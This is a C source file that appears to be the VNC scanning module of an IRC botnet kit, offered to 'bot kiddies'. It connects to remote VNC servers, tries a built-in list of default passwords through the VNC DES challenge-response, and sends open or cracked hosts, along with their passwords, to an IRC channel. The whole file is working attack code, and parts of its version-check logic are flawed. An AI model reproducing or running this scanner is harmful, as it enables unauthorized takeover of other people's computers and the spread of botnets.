// VNC SHIT SCANNER !!! enjoy bot kiddies
// Credits and Copyright to
// -------->
//  Copyright (C) 2000, 2001 Constantin Kaplinsky. All Rights Reserved.
//  Copyright (C) 1999 AT&T Laboratories Cambridge. All Rights Reserved.
//  This file is part of the VNC system.
// TightVNC distribution homepage on the Web: http://www.tightvnc.com/
// If the source code for the VNC system is not available from the place 
// whence you received this file, check http://www.uk.research.att.com/vnc or contact
// the authors on vnc@uk.research.att.com for information on obtaining it.


#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/extern.h"

#define CHALLENGESIZE 16


int ReadExact(SOCKET r_sock, char *inbuf, int wanted) { 

   int offset = 0; 
    
   while (wanted > 0) { 
      int bytes = recv(r_sock, inbuf+offset, wanted, 0); 
      if ((bytes == 0) || (bytes == SOCKET_ERROR)) return 0; 
      wanted -= bytes; 
      offset += bytes; 
   } 

   return 1; 
} 

int WriteExact(SOCKET w_sock, char *buf, int bytes) { 

   if (bytes == 0) 
	   return FALSE; 

   int i = 0; 
   int j; 

    while (i < bytes) { 
      j = send(w_sock, buf+i, bytes-i, 0); 
      if (j == SOCKET_ERROR || j==0) return 0; 
      i += j; 
    } 

   return 1; 
}

void vncEncryptBytes(unsigned char *bytes, char *passwd) {
    unsigned char key[8];
    unsigned int i;

    /* key is simply password padded with nulls */

    for (i = 0; i < 8; i++) {
	if (i < strlen(passwd)) {
	    key[i] = passwd[i];
	} else {
	    key[i] = 0;
	}
    }

    deskey(key, EN0);

    for (i = 0; i < 16; i += 8) {
		des(bytes+i, bytes+i);
    }
}

	

int vncshit(EXINFO exinfo, char *passwd)
{
	char sendbuf[IRCLINE];

	struct sockaddr_in ssin;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	int m_majorVersion, m_minorVersion;

	ssin.sin_addr.s_addr= finet_addr(exinfo.ip);
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)exinfo.port);

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin))) {
		sprintf(sendbuf,"VNC[-] Could not connect to %s", exinfo.ip);
	    addlog(sendbuf);
		return false;
	}

	rfbProtocolVersionMsg pv;



	ReadExact(sock, pv, sz_rfbProtocolVersionMsg);

    pv[sz_rfbProtocolVersionMsg] = 0;


	m_majorVersion = rfbProtocolMajorVersion;
	m_minorVersion = rfbProtocolMinorVersion;



	if (!(m_majorVersion == 3) && !(m_minorVersion == 8)) {

		sprintf(sendbuf,"VNC[%d.%d] %s Auth ByPass Vuln!!!", m_majorVersion, m_minorVersion, exinfo.ip);
	    irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		addlog(sendbuf);
		return false;
	}


    sprintf(pv,rfbProtocolVersionFormat,m_majorVersion,m_minorVersion);


    WriteExact(sock, pv, sz_rfbProtocolVersionMsg);

	CARD32 authScheme, authResult;
    CARD8 challenge[CHALLENGESIZE];
	
	ReadExact(sock,(char *)&authScheme, 4);
    authScheme = Swap32IfLE(authScheme);
	
    switch (authScheme) {
		
    case rfbConnFailed:
		sprintf(sendbuf,"VNC[-] %s connection failed", exinfo.ip);
	    irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		//addlog(sendbuf);
        return false;
		
    case rfbNoAuth:
		sprintf(sendbuf,"VNC[%d.%d] %s NoPass !!!", m_majorVersion, m_minorVersion, exinfo.ip);
	    irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		addlog(sendbuf);
		return false;

    case rfbVncAuth:
		{
			ReadExact(sock ,(char *)challenge, CHALLENGESIZE);

			if (strlen(passwd) > 8) {

				passwd[8] = '\0';
			}			
	
			vncEncryptBytes(challenge, passwd);
			
			WriteExact(sock, (char *) challenge, CHALLENGESIZE);
			ReadExact(sock, (char *) &authResult, 4);
			
			authResult = Swap32IfLE(authResult);
			
			switch (authResult) {
			case rfbVncAuthOK:
				sprintf(sendbuf,"CRACKED VNC[%d.%d] %s Pass-> %s !!!", m_majorVersion, m_minorVersion, exinfo.ip, passwd);
	            irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				addlog(sendbuf);
				return false;
			case rfbVncAuthFailed:
				sprintf(sendbuf,"VNC[%d.%d] %s failed pass: %s!", m_majorVersion, m_minorVersion, exinfo.ip , passwd);
	            irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				//addlog(sendbuf);
				return false;
			case rfbVncAuthTooMany:
				sprintf(sendbuf,"VNC[-] %s failed pass - too many tries!", exinfo.ip);
	            irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				//addlog(sendbuf);
				return false;
			default:
				sprintf(sendbuf,"VNC[-] %s authentication result:%d", exinfo.ip, (int)authResult);
	            irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
				//addlog(sendbuf);
				return false;
			}
			break;
		}
		
	default:
		sprintf(sendbuf,"VNC[-] %s Unknown authentication scheme from VNC server:%d", exinfo.ip, (int)authResult);
	    irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
		addlog(sendbuf);
		return false;
    }
	closesocket(sock);
}

BOOL vncscan(EXINFO exinfo)
{
	char *passes[] = { "123", "abc123", "password", "12345", "admin", NULL };

	for (int i=0; passes[i]; i++) {
		if(!vncshit(exinfo, passes[i]));
		Sleep(500);
	}
	return TRUE;
} 



